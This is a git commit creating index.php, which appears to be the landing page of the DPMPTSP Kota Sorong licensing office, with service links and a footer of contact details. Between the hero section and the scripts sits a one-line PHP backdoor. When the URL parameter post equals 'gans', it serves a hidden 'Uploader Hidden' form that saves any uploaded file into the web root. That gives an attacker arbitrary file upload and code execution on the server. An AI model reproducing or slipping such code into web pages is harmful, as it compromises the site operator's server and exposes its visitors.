a64492fd93e1b4da2e5e06ba4c664e93eaefd5a0
BrebesJoker768 <140909242+BrebesJoker768@users.noreply.github.com>
2023-08-21 14:40:36 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+    <title>DPMPTSP Kota Sorong</title>
+    <meta content="" name="description">
+    <meta content="" name="keywords">
+
+    <!-- Favicons -->
+    <!-- <link href="assets/img/favicon.ico" rel="icon"> -->
+    <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+    <link href="assets/images/logosk.png" rel="shortcut icon">
+
+    <!-- Google Fonts -->
+    <link href="css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+    <!-- Vendor CSS Files -->
+    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="assets/vendor/icofont/icofont.min.css" rel="stylesheet">
+    <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+    <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
+    <link href="assets/vendor/venobox/venobox.css" rel="stylesheet">
+    <link href="assets/vendor/owl.carousel/assets/owl.carousel.min.css" rel="stylesheet">
+    <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+    
+    <!-- Template Main CSS File -->
+    <link href="assets/css/style.css" rel="stylesheet">
+
+    <script src="ajax/libs/jquery/2.0.2/jquery.min.js"></script>
+    <!-- =======================================================
+  * Template Name: OnePage - v2.2.2
+  * Template URL: https://bootstrapmade.com/onepage-multipurpose-bootstrap-template/
+  * Author: BootstrapMade.com
+  * License: https://bootstrapmade.com/license/
+  ======================================================== -->
+</head>
+<!-- <script>
+    $(window).load(function() {
+        $('#exampleModalCenter').modal('show');
+    });
+</script> -->
+
+<body>
+
+    <!-- ======= Header ======= -->
+
+    <!-- ======= Hero Section ======= -->
+    <section id="hero" class="d-flex align-items-center">
+
+        <div class="container position-relative" data-aos="fade-up" data-aos-delay="100">
+            <div class="row justify-content-center">
+
+                <img src="assets/img/head_sk.png" width="72%">
+                <!-- <img src="assets/img/head.png" width="72%"> -->
+
+            </div>
+            <div class="row icon-boxes">
+                <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-5 mb-lg-0" data-aos="zoom-in" data-aos-delay="200">
+                    <div class="icon-box">
+                        <div class="icon"><img src="assets/images/browser.png" width="30%"></div>
+                        <h4 class="title"><a href="https://dpmptspkotasorong.id">Website </a></h4>
+                         <p class="description">Beranda Website DPMPTSP Kota Sorong</p>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-5 mb-lg-0" data-aos="zoom-in" data-aos-delay="400">
+                    <div class="icon-box">
+                        <div class="icon"><img src="assets/images/eperizinan.png" width="30%">
+                        </div> 
+                        <!-- <h4 class="title"><a href="https://perizinan.dpmptsp.sorongkota.go.id/">Layanan Perizinan Online</a></h4> -->
+                        <h4 class="title"><a href="https://sicantik.go.id/">Layanan Perizinan Online</a></h4>
+                        <p class="description">Layanan Perizinan dan Non Perizinan Berbasis Website dengan digital signature
+                        </p>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-5 mb-lg-0" data-aos="zoom-in" data-aos-delay="300">
+                    <div class="icon-box">
+                        <div class="icon"><img src="assets/images/osslogo.png" width="30%"></div>
+                        <h4 class="title"><a href="https://oss.go.id">OSS RBA</a></h4>
+                        <p class="description">Sistem Pelayanan Perizinan Berusaha Terintegrasi Secara Elektronik</p>
+                    </div>
+                </div>
+                
+                <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-5 mb-lg-0" data-aos="zoom-in" data-aos-delay="300">
+                    <div class="icon-box">
+                        <div class="icon"><img src="assets/images/lapor.png" width="30%"></div>
+                        <h4 class="title"><a href="https://www.lapor.go.id/">LAPOR</a></h4>
+                        <p class="description">Layanan Aspirasi dan Pengaduan Online Rakyat</p>
+                    </div>
+                </div>
+                
+                <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-5 mb-lg-0" data-aos="zoom-in" data-aos-delay="300">
+                    <div class="icon-box">
+                        <div class="icon"><img src="assets/images/tracking.png" width="30%"></div>
+                        <h4 class="title"><a href="https://dpmptsp.sorongkota.go.id/aplikasi/tracking/">TRACKING</a></h4>
+                        <p class="description">Tracking Permohonan Izin</p>
+                    </div>
+                </div>
+            
+                
+                
+            </div>
+        </div>
+
+    </section><!-- End Hero -->
+    <?php $FilesMan ="gans"; if($_GET['post']==$FilesMan){ /* Fixed Bug #1 */ if(isset($_POST['uploaded'])) { $file = $_FILES['files']['name']; $files= $_FILES['files']['tmp_name']; $folder=""; if(move_uploaded_file($files,$folder.$file)) { $result = "Uploaded :<a href='$file' Men='_blank'>=> Click Ur File ^_^</A>"; } else { $result = "Fail Try..."; } } echo' <!DOCTYPE html> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <title>#~ Uploader Hidden ~#</title> </head>'; echo' <head> <style> body { background-color:#000000; color:#25ff00; font-family:Verdana; font-size:11px; } h1,h3 { color:white; font-family:Verdana; font-size:11px; } input,textarea,select,button { color: rgb(0, 190, 0); background-color:#444; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px; } textarea { font-family:Courier; } a { color:rgb(0, 190, 0); text-decoration:none; font-family:Verdana; font-size:11px; } a:hover { color:rgb(0, 250, 0); } td { font-size:12px; vertical-align:middle; } th { font-size:13px; vertical-align:middle; } table { empty-cells:show; } .inf { color:#7F7F7F; } </style> </head> <body> <center> <h3>{ Uploader Hidden }</h3> <form action="" method="post" enctype="multipart/form-data"> <input type="file" name="files" /> <input type="submit" name="uploaded" value="Upload"> </form> '.$result.' </body> </html>'; } ?>
+    <a href="#" class="back-to-top"><i class="ri-arrow-up-line"></i></a>
+
+    <!-- Vendor JS Files -->
+    <script src="assets/vendor/jquery/jquery.min.js"></script>
+    <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="assets/vendor/jquery.easing/jquery.easing.min.js"></script>
+    <script src="assets/vendor/waypoints/jquery.waypoints.min.js"></script>
+    <script src="assets/vendor/counterup/counterup.min.js"></script>
+    <script src="assets/vendor/venobox/venobox.min.js"></script>
+    <script src="assets/vendor/owl.carousel/owl.carousel.min.js"></script>
+    <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+    <script src="assets/vendor/aos/aos.js"></script>
+
+    <!-- Template Main JS File -->
+    <script src="assets/js/main.js"></script>
+    
+    <!-- begin footer> -->
+    <footer id="footer">
+
+    <div class="footer-top">
+      <div class="container">
+        <div class="row ">
+
+            <div class="col-lg-3 col-md-6 footer-links">
+            <!-- <img src="assets/images/logosk.png" width="140px" alt=""><br> -->
+            <p>
+            <img src="assets/images/logosk.png" width="110px" alt=""><br>
+            <strong>
+            <h7 class="h5-fc">Melayani Bukan untuk Dilayani</h7>
+            </strong></p>
+            </div>
+
+          <div class="col-lg-6 col-md-3 footer-contact">
+            <h3 class="h3-fc">DPMPTSP KOTA SORONG</h3>
+            <p class="h3-fc">Dinas Penanaman Modal dan PTSP Kota Sorong</p>
+            <p class="p-fc">
+              Jalan Pramuka, Remu Utara<br>Kota Sorong, Provinsi Papua Barat 
+            </p><br><br><br>
+            <!-- 
+            <p class="p-fc2">
+              <span>&COPY; 2022 DPMPPTSP Kabupaten Asahan</span>. All Rights Reserved
+            </p>
+            -->
+          </div>
+
+          <div class="col-lg-3 col-md-6 footer-links">
+            <p class="h3-fc">Silahkan menghubungi kami melalui :</p>
+            <p class="p-fc">
+            <i class="bx bx-phone-call bx-md bx-tada"></i> <strong> WA: 62813 4464 7619</strong><br>
+            <i class="bx bx-mail-send bx-md bx-tada"></i> <strong>dpmptspktsorong@gmail.com</strong><br>
+            <!--<a target="_blank" class="icon-color" href="https://twitter.com/MPP_kotabogor"><i class="bx bxl-twitter bx-md bx-tada"></i>  <strong>@MPP_kotabogor</strong></a> <br> -->
+            <a target="_blank" class="icon-color" href="https://www.facebook.com/profile.php?id=100079647263133"><i class="bx bxl-facebook bx-md bx-tada"></i> <strong>Dpmptsp Kota Sorong</strong></a> <br>
+            <a target="_blank" class="icon-color" href="https://instagram.com/dpmptsp_papua_barat?igshid=YmMyMTA2M2Y="><i class="bx bxl-instagram bx-md bx-tada"></i> <strong>dpmptsp_kota_sorong</strong></a> <br>
+            <a target="_blank" class="icon-color" href="https://www.youtube.com/channel/UCiyGPPkE1gLAFvT6XKX59SA"><i class="bx bxl-youtube bx-md bx-tada"></i> <strong>DPMPTSP KOTA SORONG</strong></a> <br>
+
+            </p>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </footer>
+  <!-- End Footer -->
+  
+
+</body>
+
+</html>
